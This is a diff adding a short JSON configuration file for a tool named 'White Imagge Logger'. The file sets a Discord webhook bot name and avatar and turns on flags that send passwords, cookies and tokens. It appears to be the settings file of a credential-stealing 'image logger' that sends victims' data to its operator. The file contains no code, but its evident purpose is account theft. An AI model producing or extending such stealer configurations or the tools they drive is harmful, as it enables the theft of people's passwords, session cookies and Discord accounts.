@@ -1,0 +1,30 @@
+{
+    "Title_Configs":[
+        {
+
+           "name": "White Imagge Logger",
+           "servername": "White Imagge Logger",
+           "program": "White Imagge Logger"
+
+        }
+    ],
+
+    "Webhook_config":[
+        {
+
+          "Bot_Name": "White Img Logger",
+          "Bot_Avatar": "https://cdn.discordapp.com/avatars/1052327906568835193/a_e2062fcfefb2070c53e5a976fb5b92c6.gif?size=2048"
+  
+        }
+    ],
+
+    "Other_Configs":[
+        {
+          "SendPasswords": true,
+          "SendCookie": true,
+          "SendToken": true
+        }
+    ]
+
+
+}
